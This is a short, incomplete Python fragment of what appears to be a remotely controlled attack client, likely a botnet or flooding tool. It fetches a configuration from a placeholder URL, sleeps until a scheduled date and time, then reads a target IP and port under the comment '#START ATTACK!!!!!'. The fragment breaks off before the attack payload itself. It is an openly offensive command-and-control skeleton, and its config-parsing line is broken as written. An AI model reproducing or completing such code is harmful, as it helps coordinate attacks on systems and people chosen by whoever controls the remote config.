config_url = "YOU RAW CONFIG URL PATH"
...
config = json.loads(requests.get(config_url))
year = config["year"]
mon = config["month"]
day = config["day"]
hour = config["hour"]
...
#calc seconds to attack
to_attack = datetime.datetime(year, mon, day, hour, minute, second) - now
time.sleep(to_attack.total_seconds())

#START ATTACK!!!!!

ATTACK_IP = config["ip"]
ATTACK_PORT = config["port"]
